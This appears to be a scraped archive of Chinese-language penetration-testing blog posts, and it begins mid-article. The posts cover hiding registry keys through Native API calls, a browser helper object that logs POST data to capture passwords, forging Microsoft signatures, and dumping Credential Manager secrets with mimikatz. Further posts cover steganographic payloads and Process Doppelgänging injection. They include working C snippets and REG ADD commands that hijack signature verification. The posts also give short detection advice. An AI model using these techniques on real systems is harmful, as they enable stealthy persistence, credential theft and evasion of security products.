MySetValueKey(hKey,&quot;test2&quot;,&quot;0123456789abcdef&quot;,REG_SZ); 再次使用regedit.exe查看注册表，有趣的事情发生了，如下图 查询注册表键值\Registry\Machine\Software\test2不再弹框报错，而是显示两个名为test2的键值，内容均为0123456789abcdef 我们知道，注册表不允许创建两个名称相同的注册表键值，而上述测试产生的两个同名键值，实际上是因为其中的一个被错误的截断，导致显示键值名称相同，键值内容也相同，为0123456789abcdef(实际上内容为hidden0123456789abcdef) 这样我们就又多了一种”隐藏”注册表的方法，相比于之前的在首位填”\0”，这个隐藏方法最大的优点是使用regedit.exe查看该键值时不会弹框报错，隐蔽效果更好，同时又具有欺骗性，同正常键值内容相同 对比如下图 显示键值内容为0123456789abcdef，实际上为hidden0123456789abcdef 0x05 其他Native API(如NtCreateFile)能否应用？ 参考NtCreateKey的实现思路，测试其他Native API，例如NtCreateFile，在创建文件时是否存在相同问题？ 使用NtCreateFile创建特殊文件： \0c:\1\test.txt，关键代码如下： HMODULE hModule = NULL; NTCREATEFILE NtCreateFile = NULL; UNICODE_STRING FileName = {0}; OBJECT_ATTRIBUTES ObjectAttributes = {0}; HANDLE hFile1 = NULL; IO_STATUS_BLOCK IOsb = {0}; HANDLE hFile2 = INVALID_HANDLE_VALUE; PWCHAR pBuffer = NULL; DWORD dwRet = 0; hModule = LoadLibrary(_T(&quot;ntdll.dll&quot;)); if (!hModule) { printf(&quot;Could not GetModuleHandle of NTDLL.DLL&quot;); return FALSE; } NtCreateFile = (NTCREATEFILE)GetProcAddress(hModule, &quot;NtCreateFile&quot;); if (!NtCreateFile) { printf(&quot;Could not find NtCreateFile entry point in NTDLL.DLL&quot;); return FALSE; } char *Path = &quot;\\Device\\\HarddiskVolume1\\1\\test.txt&quot;; char *TempBuff; TempBuff = (char*)malloc(strlen(Path+2)*2); for(int i=0;i&lt;strlen(Path);i++) { TempBuff[(i+2)*2] = Path[i]; TempBuff[(i+2)*2+1] = 0x00; } TempBuff[0] = 0x00; TempBuff[1] = 0x00; TempBuff[2] = 0x00; TempBuff[3] = 0x00; FileName.MaximumLength = MAX_PATH * sizeof(WCHAR); FileName.Length = (strlen(Path)+2)*sizeof(WCHAR); FileName.Buffer = (WCHAR *)TempBuff; FileName.Buffer[FileName.Length] = L&#39;\0&#39;; InitializeObjectAttributes(&amp;ObjectAttributes,&amp;FileName,OBJ_CASE_INSENSITIVE,NULL,NULL); NtStatus = NtCreateFile(&amp;hFile1, FILE_GENERIC_WRITE, &amp;ObjectAttributes, &amp;IOsb, NULL, FILE_ATTRIBUTE_NORMAL, 0, FILE_SUPERSEDE, FILE_SEQUENTIAL_ONLY, NULL, 0 ); if (!NT_SUCCESS(NtStatus)) { printf(&quot;NtCreateFile failed (%x) \n&quot;, NtStatus); } else printf(&quot;NtCreateFile succeed \n&quot;); 返回错误c000003b，表示STATUS_OBJECT_PATH_SYNTAX_BAD 调试程序，跟踪到InitializeObjectAttributes，查看结构体ObjectAttributes的参数，如下图 查看Buffer在内存中的内容，如下图 同NtCreateKey实现时的参数结构相同 对于NtCreateFile，暂时无法应用 0x06 利用思路与检测 Poweliks使用过的注册表隐藏技术，最大的问题是使用regedit.exe打开时会弹框报错，如果将\0插在字符串中间，同时新建一个\0前字符串的同名键值，就能避免这个问题 对此，检测思路就是要找到这种不寻常的注册表键值，查看注册表键值下是否存在两个相同名称的键值 如果利用这种方式在启动项位置新建注册表键值，使用Autoruns是能够检测出来的 0x07 小结 本文对Poweliks使用过的注册表隐藏技术做了进一步测试，分享一种更为隐蔽的利用方法，同时给出了防御检测的思路，对于其他Native API的应用，还需要更多测试 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——"隐藏"注册表的创建]]></title>
    <url>%2Fposts%2Ff95bdb7a.html</url>
    <content type="text"><![CDATA[0x00 前言 知名恶意软件Poweliks曾使用过的一个后门技术，在注册表启动位置创建一个特殊的注册表键值，通过mshta来执行payload 对于这个特殊的注册表键值，在正常情况下无法对其访问，这其中的原理是什么呢?如何读取、创建以及如何删除呢?本文将要一一介绍 0x01 简介 本文将要介绍以下内容： 隐藏注册表的原理 隐藏注册表的实现 程序编写上需要注意的问题 0x02 原理 注册表键值名称经过特殊构造： 以”\0”作为开头，后面加上任意字符(不能为数字) 对于Windows系统，”\0”(即0x0000)会被识别为字符串的结束符，所以在对该字符串读取的过程中，遇到开头的”\0”，会被解析成结束符，提前截断，导致读取错误 而使用Native API设定注册表，需要使用结构体OBJECT_ATTRIBUTES作为参数， 指定读取的字符串长度 只要长度设定正常，就能够读取正确的字符串，避免这个bug 所以，我们可以通过Native API来创建这个特殊的注册表名 更为重要的是，像regedit.exe和其他对注册表的操作，通常会调用Win32 API，这就导致该注册表无法被读取，也就实现了所谓的”隐藏” 综上，创建方法为： 通过Native API创建一个以”\0”开头的键值 0x03 编写程序实现 通过Native API实现对注册表的操作，可供参考的工程地址： https://www.codeproject.com/Articles/14508/Registry-Manipulation-Using-NT-Native-APIs 作者Dan Madden，他的代码使用了类的封装 个人倾向于使用最基本的api实现，于是参考他的代码，重新设计 对于Native API，需要的结构如下： 1.获取Native API的地址注册表操作的相关Native API可从ntdll.dll中获得 关键代码如下： HINSTANCE hinstStub = GetModuleHandle(_T(&quot;ntdll.dll&quot;)); NtOpenKey = (LPNTOPENKEY)GetProcAddress(hinstStub, &quot;NtOpenKey&quot;); 2.Native API的重定义和声明Native API在使用前需要重定义和声明 部分关键代码如下： typedef NTSTATUS (STDAPICALLTYPE NTOPENKEY) ( IN HANDLE KeyHandle, IN ULONG DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes ); typedef NTOPENKEY FAR * LPNTOPENKEY; LPNTOPENKEY NtOpenKey; 3. 特殊结构体的使用注册表操作相关Native API会使用到如下结构体，需要定义和声明 InitializeObjectAttributes _STRING _UNICODE_STRING _OBJECT_ATTRIBUTES _KEY_INFORMATION_CLASS _KEY_BASIC_INFORMATION _KEY_VALUE_PARTIAL_INFORMATION _KEY_VALUE_INFORMATION_CLASS RtlInitAnsiString RtlAnsiStringToUnicodeString Dan Madden的工程实现了创建隐藏注册表项(注册表项名称以\0开头)，该注册表项下的键值通过正常的Native API实现创建、读取、删除 通过最基本api的实现过程不再赘述，封装好的API源代码可参考文末给出的链接 测试Dan Madden工程包含的功能： 1.创建隐藏注册表项MyCreateHiddenKey(&quot;\\Registry\\Machine\\Software\\testhidden&quot;); 使用注册表工具regedit.exe无法打开该键值，如下图 2.在该注册表下创建注册表键值先获得该注册表项的句柄： hKey = MyOpenHiddenKey(&quot;\\Registry\\Machine\\Software\\testhidden&quot;); 创建注册表项下的键值test1并赋值： MySetValueKey(hKey,&quot;test1&quot;,&quot;0123456789abcdef&quot;,REG_SZ); 读取该注册表项下键值test1的内容： MyQueryValueKeyString(hKey,&quot;test1&quot;); 删除该注册表项下的键值test1： MyDeleteValueKey(hKey,&quot;test1&quot;); 删除注册表项： MyDeleteKey(hKey); 程序输出如下图，成功对隐藏注册表项下的正常键值进行操作 接下来，对Dan Madden的工程添加新的功能：创建、读取、删除隐藏注册表键值，思路如下： 对于注册表项的隐藏，在注册表项的名称首位填”\0”即可 对应注册表键值的隐藏，原理上也是在键值的名称首位填”\0”，但在参数传递上需要注意更多问题 1.不需要修改的功能创建注册表键、打开注册表键和删除注册表键的功能不需要修改，使用正常的名称即可 2.设置注册表键值对应源代码中的MySetHiddenValueKey 传入参数使用char型数组，，用来定义注册表键值名称，内容为”\0abcd” 由于”\0”的存在，所以无法直接使用strlen计算数组长度 变通方法： 计算从偏移2开始的数组长度，最终再加2 即len = strlen(buf+2)+2 Native API NtSetValueKey用来设定键值，定义如下： typedef NTSTATUS (STDAPICALLTYPE NTSETVALUEKEY) ( IN HANDLE KeyHandle, IN PUNICODE_STRING ValueName, IN ULONG TitleIndex, /* optional */ IN ULONG Type, IN PVOID Data, IN ULONG DataSize ); 第二个参数指定键值名称，需要使用结构体UNICODE_STRING 正常情况下，我们需要先使用RtlInitAnsiString将传入的buf数组转换成结构体ANSI_STRING，再使用RtlAnsiStringToUnicodeString将其转换成结构体UNICODE_STRING，作为参数 由于”\0”的存在，无法使用RtlAnsiStringToUnicodeString 所以，我们需要自己实现结构体ANSI_STRING向结构体UNICODE_STRING的转换 ANSI向UNICODE的转换，在长度计算上，乘以2即可 数组内容上，奇数位赋值，偶数为填0x00 当然，我们需要一个中转数组TempBuff实现数组内容的转换 关键代码如下： ValueName.Length = asName.Length*2; ValueName.MaximumLength = asName.MaximumLength*2; char *TempBuff; TempBuff = (char*)malloc(ValueName.Length); for(int i=0;i&lt;asName.Length;i++) { TempBuff[i*2] = asName.Buffer[i]; TempBuff[i*2+1] = 0x00; } ValueName.Buffer = (WCHAR *)TempBuff; 第四个参数，指定键值内容，需要将传入的char数组转换为WCHAR 关键代码： WCHAR wszValue[1024]; unsigned int n ; for (n=0; n&lt;strlen(csData); n++) { wszValue[n] = (WCHAR)csData[n]; } wszValue[n++] = L&#39;\0&#39;; 3.读取注册表键值对应源代码中的MyQueryHiddenValueKeyString 参照2，需要注意”\0”的影响 4、删除注册表键值对应源代码中的MyDeleteHiddenValueKey 参照2，需要注意”\0”的影响 实际测试： 创建注册表项test2,创建隐藏注册表键值\0test2,创建正常注册表键值test2 直接打开，如下图 能够正常访问注册表键值test2，但无法访问注册表键值\0test2 如下图 而我们编写的程序能够正常读取，如下图 至此，成功实现对注册表键值的隐藏 以上功能代码已开源，地址如下： https://github.com/3gstudent/HiddenNtRegistry 0x04 powershell实现 可参考Brian Reitz的工程，地址如下： https://gist.github.com/brianreitz/feb4e14bd45dd2e4394c225b17df5741 具体说明可参考： https://posts.specterops.io/hiding-registry-keys-with-psreflect-b18ec5ac8353?source=collection_archive---------2---------------- 实现了在HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run下创建键值\0abcd，内容为mshta javascript:alert(1) 使用我们编写的程序成功读取该键值，如下图 0x05 补充 PSReflect-Functions包含多个通过powershell调用API的实例代码，地址如下： https://github.com/jaredcatkinson/PSReflect-Functions 0x06 小结 本文介绍了Poweliks使用过的注册表隐藏技术，分析原理，编写c程序实现功能，测试powershell实现代码 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[利用BHO实现IE浏览器劫持]]></title>
    <url>%2Fposts%2F6066e8e3.html</url>
    <content type="text"><![CDATA[0x00 前言 本文源于一个隐蔽连接的测试，模拟IE浏览器发起网络连接，能绕过某些防护产品拦截发起网络连接的第三方程序 模拟IE浏览器发起网络连接的方法有很多种，其中，利用BHO劫持IE浏览器存在诸多优点(开放接口、简单高效、功能丰富等)，所以本文将要介绍BHO的开发和劫持利用思路 0x01 简介 本文将要介绍以下内容： BHO简介 开发BHO 利用思路 实际测试 防御 0x02 BHO简介 BHO，全称Browser Helper Object(浏览器辅助对象) 微软推出的作为浏览器对第三方程序员开放交互接口的业界标准 BHO的作用： 获取浏览器行为，如“后退”、“前进”、“当前页面”等 控制浏览器行为，如修改替换浏览器工具栏，添加自己的程序按钮等 BHO依托于浏览器主窗口, 与浏览器实例生命周期一致，即浏览器页面打开时BHO对象运行，页面关闭时随之结束 使用BHO时需要注册，相当于写入注册表，位于HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper\ Objects\{GUID}和HKEY_CLASSES_ROOT\CLSID\{GUID} 0x03 开发BHO 本节仅作简要介绍 开发工具： VS2012 1、生成dll新建-Visual C++-ATL 添加-类-ATL-ATL简单对象，设定简称为HelloWorldBHO，选中IObjectWithSite(IE对象支持) 修改以下文件： HelloWorldBHO.h HelloWorldBHO.cpp dllmain.cpp HelloWorld.rgs 注： 详情可参考http://blog.csdn.net/feier7501/article/details/11266345 helloworld.rgs内保存BHO的GUID，如下图 HelloWorldBHO.rgs内保存BHO的名称，如下图 helloworld.rc内的CompanyName代表发行者，PRODUCTVERSION代表版本，如下图 注： 以上三个图对应下文加载项的显示信息 HelloWorldBHO.cpp保存IE浏览器中不同事件对应的操作，这里仅介绍一段实例代码(详细代码参照开源工程)，实现当页面加载完成时，弹框显示当前URL，关键代码如下： void STDMETHODCALLTYPE CHelloWorldBHO::OnDocumentComplete(IDispatch *pDisp, VARIANT *pvarURL) { BSTR url = pvarURL-&gt;bstrVal; CComBSTR u(url); // Retrieve the top-level window from the site. HWND hwnd; HRESULT hr = m_spWebBrowser-&gt;get_HWND((LONG_PTR*)&amp;hwnd); if (SUCCEEDED(hr)) { MessageBox(0, u, L&quot;the url is&quot;, MB_OK); } } 编译生成helloworld.dll 注： 如果VS2012不是管理员权限，编译时提示无法注册，接下来可以手动注册 2、注册dll需要管理员权限，命令如下: regsve32 helloworld.dll /s 注： /s参数用来去掉注册成功的提示框 相当于写入注册表，位于HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Explorer\Browser Helper\ Objects\{GUID}和HKEY_CLASSES_ROOT\CLSID\{GUID} 补充： 卸载dll： regsve32 helloworld.dll /s /u 或者删除对应的注册表键值 0x04 实际测试 测试系统： Win 7x86 IE8 打开IE浏览器，弹出对话框，显示当前URL，如下图 查看IE的加载项，位于工具-管理加载项，获得加载项信息，如下图 其中的名称、发行者、版本可通过前文的helloworld.rgs、HelloWorldBHO.rgs、helloworld.rc指定，文件日期对应dll的修改时间 由于我们自己生成的dll没有微软签名，所以显示未验证 0x05 利用思路 1、伪造微软签名，隐藏BHO向helloworld.dll添加微软的Authenticode签名，修改注册表劫持系统的签名验证功能，使签名生效 可参考之前的文章： 《Authenticode签名伪造——PE文件的签名伪造与签名验证劫持》 需要使用Microsoft Corporation的签名，可在Office文件中获得，可用的路径： C:\Program Files\Microsoft Office\Office14\URLREDIR.DLL 使用SigThief添加签名，下载地址： https://github.com/secretsquirrel/SigThief 参数： sigthief.py -i &quot;C:\Program Files\Microsoft Office\Office14\URLREDIR.DLL&quot; -t helloworld.dll -o new.dll 生成new.dll 修改注册表，劫持签名签证功能：(管理员权限) REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;Dll&quot; /t REG_SZ /d &quot;C:\Windows\System32\ntdll.dll&quot; /f REG ADD &quot;HKLM\SOFTWARE\Microsoft\Cryptography\OID\EncodingType 0\CryptSIPDllVerifyIndirectData\{C689AAB8-8E78-11D0-8C47-00C04FC295EE}&quot; /v &quot;FuncName&quot; /t REG_SZ /d &quot;DbgUiContinue&quot; /f 注册dll，重新打开IE，查看加载项，验证通过，如下图 注： 修改BHO的信息能够进一步隐藏BHO 2、抓取浏览器POST数据，记录明文口令抓取浏览器POST数据的开源代码可从github获得，参考地址： https://github.com/liigo/bho 在BeforeNavigate2事件前抓取浏览器的POST数据 我在自己的工程中直接引用了其中的关键函数： STDMETHODIMP CBhoApp::Invoke(DISPID dispidMember, REFIID riid, LCID lcid, WORD wFlags, DISPPARAMS *pDispParams, VARIANT *pvarResult, EXCEPINFO *pExcepInfo, UINT *puArgErr) 添加函数声明，实现记录日志的功能 注： GetTempPath获取当前系统的Temp目录，IE权限下实际的路径为%Temp%\Low 完整代码已开源，地址如下： https://github.com/3gstudent/IE-BHO-POSTdata-Logger 抓取浏览器POST数据，能够获得用户输入的明文口令，例如github的登录密码，如下图 3、下载文件通过这种方式下载文件，防火墙软件的管理端显示下载文件的程序为IE浏览器，能够在一定程度上实现隐藏 4、在IE页面注入js可参考以下开源工程做进一步修改： https://github.com/xiyiaoo/BHO 本文不做进一步介绍 5、补充默认BHO的权限为low，所以在操作上会有一些限制，如果通过其他方式获得了高权限，那么可供利用的方式会更多 0x06 防御检测 防御： BHO利用的前提是需要获得系统的管理员权限 检测： 查看IE浏览器中的加载项 查看IE进程加载的dll 0x07 小结 本文介绍了IE浏览器辅助对象BHO的开发方法，分析了在获得系统管理员权限后的利用思路，部分利用技术点到为止 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Invoke-PSImage利用分析]]></title>
    <url>%2Fposts%2F2af08c5c.html</url>
    <content type="text"><![CDATA[0x00 前言 最近在github看见一个有趣的项目：Invoke-PSImage，在png文件的像素内插入powershell代码作为payload(不影响原图片的正常浏览)，在命令行下仅通过一行powershell代码就能够执行像素内隐藏的payload 这是一种隐写(Steganography)技术的应用，我在之前的文章对png的隐写技术做了一些介绍，可供参考： 《隐写技巧——PNG文件中的LSB隐写》 《隐写技巧——利用PNG文件格式隐藏Payload》 本文将结合自己的一些心得对Invoke-PSImage进行分析，介绍原理，解决测试中遇到的问题，学习脚本中的编程技巧，提出自己的优化思路 Invoke-PSImage地址： https://github.com/peewpw/Invoke-PSImage 0x01 简介 本文将要介绍以下内容： 脚本分析 隐写原理 实际测试 编程技巧 优化思路 0x02 脚本分析 1、参考说明文件https://github.com/peewpw/Invoke-PSImage/blob/master/README.md (1) 选取每个像素的两个颜色中的4位用于保存payload (2) 图像质量将受到影响 (3) 输出格式为png 2、参考源代码对上述说明进行分析(1) 像素使用的为RGB模式，分别选取颜色分量中的G和B的低4位(共8位)保存payload (2) 由于同时替换了G和B的低4位，故图片质量会受影响 补充： LSB隐写是替换RGB三个分量的最低1位，人眼不会注意到前后变化，每个像素可以存储3位的信息 猜测Invoke-PSImage选择每个像素存储8位是为了方便实现(8位=1字节)，所以选择牺牲了图片质量 (3) 输出格式为png，需要无损 png图片为无损压缩(bmp图片也是无损压缩)，jpg图片为有损压缩。所以在实际测试过程，输入jpg图片，输出png图片，会发现png图片远远大于jpg图片的大小 (4) 需要注意payload长度，每个像素保存一个字节，像素个数需要大于payload的长度 0x03 隐写原理 参照源代码进行举例说明(跳过读取原图片的部分) 1、修改像素的RGB值，替换为payload代码起始位置： https://github.com/peewpw/Invoke-PSImage/blob/master/Invoke-PSImage.ps1#L110 对for循环做一个简单的修改，假定需要读取0x73，将其写入第一个像素RGB(0x67,0x66,0x65) （1） 读取payload代码： $paybyte1 = [math]::Floor($payload[$counter]/16) 说明： $payload[$counter]/16表示$payload[$counter]/0x10 即取0x73/0x10，取商，等于0x07 所以，$paybyte1 = 0x07 代码： $paybyte2 = ($payload[$counter] -band 0x0f) 说明： 即0x73 &amp; 0x0f，结果为0x03 所以，$paybyte2 = 0x03 代码： $paybyte3 = ($randb[($counter+2)%109] -band 0x0f) 说明： 作随机数填充，$paybyte3可忽略 注： 原代码会将payload的长度和图片的像素长度进行比较，图片多出来的像素会以同样格式被填充成随机数 （2） 向原像素赋值，添加payload原像素为RGB(0x62,0x61,0x60) 代码： $rgbValues[($counter*3)] = ($rgbValues[($counter*3)] -band 0xf0) -bor $paybyte1 说明： 即0x60 &amp; 0xf0 | 0x07 所以，$rgbValues[0] = 0x67 代码： $rgbValues[($counter*3+1)] = ($rgbValues[($counter*3+1)] -band 0xf0) -bor $paybyte2 说明： 即0x61 &amp; 0xf0 | 0x03 所以，$rgbValues[1] = 0x63 代码： $rgbValues[($counter*3+2)] = ($rgbValues[($counter*3+2)] -band 0xf0) -bor $paybyte3 说明： 随机数填充，可忽略 综上，新像素的修改过程为： R： 高位不变，低4位填入随机数G： 高位不变，低4位填入payload的低4位B： 高位不变，低4位填入payload的高4位 2、读取RGB，还原出payload对输出做一个简单的修改，读取第一个像素中的payload并还原 取第0个像素的代码如下： sal a New-Object; Add-Type -AssemblyName &quot;System.Drawing&quot;; $g= a System.Drawing.Bitmap(&quot;C:\1\evil-kiwi.png&quot;); $p=$g.GetPixel(0,0); $p; 还原payload，输出payload的第一个字符，代码如下： $o = [math]::Floor(($p.B -band 15)*16) -bor ($p.G -band 15); [math]::Floor(($p.B -band 15)*16) -bor ($p.G -band 15)); 0x04 实际测试 使用参数： Invoke-PSImage -Script .\test.ps1 -Image .\kiwi.jpg -Out .\evil-kiwi.png test.ps1: 包含payload，例如”start calc.exe” kiwi.jpg： 输入图片，像素数量需要大于payload长度 evil-kiwi.png: 输出图片路径 脚本执行后会输出读取 图片解密payload并执行的代码 实际演示略 0x05 优化思路 结合前面的分析，选择替换RGB中两个分量的低4位保存payload，会在一定程序上影响图片质量，可参照LSB隐写的原理只替换三个分量的最低位，达到人眼无法区别的效果 当然，该方法仅是隐写技术的一个应用，无法绕过Win10 的AMSI拦截 在Win10 系统上测试还需要考虑对AMSI的绕过 0x06 小结 本文对Invoke-PSImage的代码进行分析，介绍加解密原理，分析优缺点，提出优化思路，帮助大家更好的进行学习研究 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[渗透技巧——Windows中Credential Manager的信息获取]]></title>
    <url>%2Fposts%2Fc4d8c4e1.html</url>
    <content type="text"><![CDATA[0x00 前言 在后渗透阶段，获得权限后需要搜集目标系统的信息。信息越全面，越有助于进一步的渗透。对于Windows系统，Credential Manager中包含十分重要的信息。这其中具体包含什么类型的信息，获取的方法有哪些呢？本文将要一一介绍 0x01 简介 本文将要介绍以下内容： Credential Manager中不同类型的凭据 不同凭据的明文口令获取方法 实际测试 0x02 Credential Manager简介 Credential Manager，中文翻译为凭据管理器，用来存储凭据(例如网站登录和主机远程连接的用户名密码) 如果用户选择存储凭据，那么当用户再次使用对应的操作，系统会自动填入凭据，实现自动登录 凭据保存在特定的位置，被称作为保管库(vault)(位于%localappdata%/Microsoft\Vault) 凭据类别：包含两种，分别为Domain Credentials和Generic Credentials Domain Credentials：只有本地Local Security Authority (LSA)能够对其读写 也就是说，普通权限无法读取Domain Credentials类型的明文口令 Generic Credentials：能够被用户进程读写 也就是说，普通权限可以读取Generic Credentials类型的明文口令 参考资料： https://msdn.microsoft.com/en-us/library/aa380517.aspx 0x03 实际测试 测试1：测试系统： Win7 访问文件共享\\192.168.62.130 如下图 填入正确的用户名密码，选中记住我的凭据 下次再访问时，就不需要再次输入用户名密码 通过控制面板能够找到添加的凭据，位置为控制面板-用户帐户和家庭安全-凭据管理器 如下图 密码被加密，无法直接查看 注： 文件共享的凭据类型默认为Domain Credentials 测试2：测试系统： Win8 使用IE浏览器访问网站 https://github.com/，登录成功后选择记录用户名密码 通过控制面板访问凭据管理器，如下图 注： Win8开始，凭据管理器的页面进行了改版(同Win7不同)，添加了Web凭据 显示凭据密码需要填入当前用户名口令，如下图 注： IE浏览器的凭据类型默认为Generic Credentials 测试3：测试系统： Win7 通过控制面板添加普通凭据，Internet地址或网络地址为Generi1，用户名为test1，密码为pass1，如下图 通过控制面板无法获得该普通凭据的明文口令 0x04 导出Credentials中的明文口令 1、获得系统凭据的基本信息工具1： vaultcmd(windows系统自带)常用命令： 列出保管库(vault)列表： vaultcmd /list 注： 不同类型的凭据保存在不同的保管库(vault)下 列出保管库(vault)概要，凭据名称和GUID： vaultcmd /listschema 注： GUID对应路径%localappdata%/Microsoft\Vault\{GUID}下的文件，如下图 列出名为”Web Credentials”的保管库(vault)下的所有凭据信息： vaultcmd /listcreds:&quot;Web Credentials&quot; 注： 如果是中文操作系统，可将名称替换为对应的GUID，命令如下 列出GUID为{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}的保管库(vault)下的所有凭据： vaultcmd /listcreds:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28} 列出GUID为{4BF4C442-9B8A-41A0-B380-DD4A704DDB28}的保管库(vault)的属性，包括文件位置、包含的凭据数量、保护方法： vaultcmd /listproperties:{4BF4C442-9B8A-41A0-B380-DD4A704DDB28} 工具2：cmdkey命令行输入cmdkey /list能够列举出系统中的Windows凭据 2、获得Domain Credentials的明文口令工具： mimikatz 参数： sekurlsa::logonpasswords 对应前面的测试1，在credman位置显示，如下图 注： mimikatz不仅能导出Domain Credentials的明文口令，也能导出普通凭据(Generic Credentials)类型的明文口令，但无法导出IE浏览器保存的Generic Credentials类型的明文口令 3、获得Generic Credentials的明文口令(1) IE浏览器保存的Generic Credentials工具： Get-VaultCredential.ps1 下载地址： https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-VaultCredential.ps1 对应前面的测试2，Win8系统成功导出明文口令，如下图 注： 该脚本也能获得名为Windows Credential的保管库(vault)下面的凭据信息，但无法获得凭据的明文口令 补充： Win7系统下的凭据管理器同Win8有区别，多了一个选项，指定程序使用此密码时提示我提供权限，如下图 当选中时，使用powershell脚本读取明文口令时会弹框提示(无法绕过)，如下图 (2) 其他类型的普通票据工具： Invoke-WCMDump.ps1 下载地址： https://github.com/peewpw/Invoke-WCMDump/blob/master/Invoke-WCMDump.ps1 对应测试3，普通用户权限即可，能够导出普通票据的明文口令，如下图 注： 该脚本还能导出Domain Credentials的信息(不包括明文口令) 0x05 小结 本文介绍了不同类型的票据(Credential)明文口令的获取方法，测试多个工具，帮助大家更好理解这部分内容 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[Process Doppelganging利用介绍]]></title>
    <url>%2Fposts%2F220b2df9.html</url>
    <content type="text"><![CDATA[0x00 前言 在最近的BlackHat Europe 2017，Tal Liberman和Eugene Kogan介绍了一种新的代码注入技术——Process Doppelgänging 据说这种利用方式支持所有Windows系统，能够绕过绝大多数安全产品的检测 于是，本文将要根据开源代码，编写程序，实现Process Doppelgänging，测试功能，分析利用思路 参考地址： https://www.blackhat.com/docs/eu-17/materials/eu-17-Liberman-Lost-In-Transaction-Process-Doppelganging.pdf 0x01 简介 本文将要介绍以下内容： 原理 开源代码 修复方法 实际测试 利用思路 防御检测 0x02 Process Doppelgänging原理 原理上类似于Process Hollowing，但是更加高级： 不需要使用傀儡进程 不需要特殊的内存操作，例如SuspendProcess和NtUnmapViewOfSection 注： 关于Process Hollowing的介绍，可参考之前的文章《傀儡进程的实现与检测》 实现思路：1.打开一个正常文件，创建transaction关于NTFS transaction，可参考： http://www.ntfs.com/transaction.htm 2.在这个transaction内填入payload，payload作为进程被启动目前为止，杀毒软件无法对填入的payload进行扫描 3.回滚transaction相当于还原transaction，清理痕迹 对应程序实现过程：1.创建transaction关键函数： NtCreateTransaction 2.在这个transaction内填入payload关键函数： CreateFileTransacted NtCreateSection 3.payload作为进程被启动关键函数： NtCreateProcessEx NtCreateThreadEx 4.回滚transaction关键函数： NtRollbackTransaction 当然，还涉及到payload的写入，申请内存、PE文件结构等，这里暂不介绍，可直接参考POC源码 对于Native API的使用，可参考之前的文章《渗透技巧——“隐藏”注册表的创建》和《渗透技巧——“隐藏”注册表的更多测试》 注： Win10 RS3前的Win10系统，使用该方法会蓝屏，原因在于NtCreateProcessEx函数传入的空指针，细节可参考： https://bugs.chromium.org/p/project-zero/issues/detail?id=852 0x03 开源POC 目前， 已公开的POC有两个 1、processrefund地址： https://github.com/Spajed/processrefund 目前仅支持64位Windows系统 编译工具：VS2015，安装sdk 实际测试： Win7 x64 测试如下图 注： 如果选择system32下的calc.exe，会提示权限不够 启动进程calc.exe，但实际上执行MalExe.exe，弹出对话框 进程calc.exe的图标和描述都是正常的calc.exe，数字签名也正常，如下图 2、hfiref0x的POChttps://gist.github.com/hfiref0x/a9911a0b70b473281c9da5daea9a177f 仅有一个c文件，缺少头文件ntos.h 可供参考的位置： https://github.com/hfiref0x/UACME/blob/master/Source/Shared/ntos.h 但是还需要作二次修改 为了更加了解细节，决定不使用ntdll.lib文件(安装DDK后包含)，改为通过ntdll获得Native API(当然，代码量也会增加) 以自己的方式重写一个ntos.h，并对原POC的inject.c作修改 开源地址如下： https://github.com/3gstudent/Inject-dll-by-Process-Doppelganging 编译工具：VS2012 支持32位Windows系统 实际测试： Win7 x86 测试如下图 注： 如果选择system32下的calc.exe，会提示权限不够 综上，我们可以看到，Process Doppelgänging在利用效果上和Process Hollowing类似：启动一个正常进程(正常的图标、签名、描述)，在这个进程中执行payload Process Doppelgänging在利用上的一个缺点： 需要替换文件，所以在替换system32下的文件时，会提示权限不够(管理员权限无法修改该路径下的文件) 0x04 利用思路 在上节我们测试了两个POC，对Process Doppelgänging有了一些认识 而在实际利用中，需要对POC作进一步修改，利用思路如下： 将读取payload的功能去掉，改为使用Buffer存储(可进行压缩编码减小长度) 执行时读取Buffer，解密执行 这样能进一步隐藏payload，实现payload的”无文件”(payload保存在exp中，不需要写入硬盘) 0x05 检测 Process Doppelgänging并不是能绕过所有的杀毒软件，几个关键函数的调用还是会被拦截(例如NtCreateThreadEx)，并且进程的内存同PE文件存在差异 0x06 小结 本文介绍了Process Doppelgänging的原理，根据开源代码，编写程序，实现Windows x86和x64系统下的利用，测试功能，分析利用思路，介绍检测方法 LEAVE A REPLY]]></content>
  </entry>
  <entry>
    <title><![CDATA[域渗透——Pass The Hash的实现]]></title>
    <url>%2Fposts%2F4396d6e9.html</url>
    <content type="text"><![CDATA[0x00 前言 在之前的文章《域渗透——Pass The Hash &amp; Pass The Key》曾介绍过kb2871997对Pass The Hash的影响。本文将站在另一个角度，介绍Pass The Hash的相关实现 0x01 简介 本文将要介绍以下内容： Pass The Hash的原理 常用工具 mimikatz中的Pass The Hash mimikatz中的Pass The Ticket 0x02 Pass The Hash的原理 可参考Wikipedia的介绍，地址如下： https://en.wikipedia.org/wiki/Pass_the_hash 提取出关键信息： 在Windows系统中，通常会使用NTLM身份认证 NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser) hash分为LM hash和NT hash，如果密码长度大于15，那么无法生成LM hash。从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash 如果攻击者获得了hash，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程) 注： mimikatz支持导出内存中用户的LM hash，但前提是Windows系统支持LM hash Windows Server 2008启用LM hash的方法： gpedit.msc-计算机配置-Windows 设置-安全设置-本地策略-安全选项 找到网络安全︰ 不要在下次更改密码存储 LAN 管理器的哈希值，选择已禁用 系统下一次更改密码后，就能够导出LM hash 0x03 常用工具 